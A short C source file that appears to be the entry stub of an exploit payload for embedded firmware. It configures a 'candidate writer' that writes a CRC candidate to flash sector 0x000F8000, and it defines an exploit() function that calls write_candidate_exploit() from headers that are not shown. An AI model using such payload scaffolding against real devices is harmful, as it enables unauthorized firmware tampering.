#define CANDIDATE_WRITER_PAYLOAD 1
#define WRITER_OPERATION PROTO_OP_WRITE_CRC_CANDIDATE
#define WRITER_DIRECTION 2u
#define WRITER_SECTOR_BASE 0x000F8000u
#define WRITER_CONTEXT_TAG 0x43524353u
#include "patch_common.h"
#include "candidate_writer.h"

void exploit(void)__attribute__((section(".text.entry"),used,noreturn));
void exploit(void){write_candidate_exploit();}
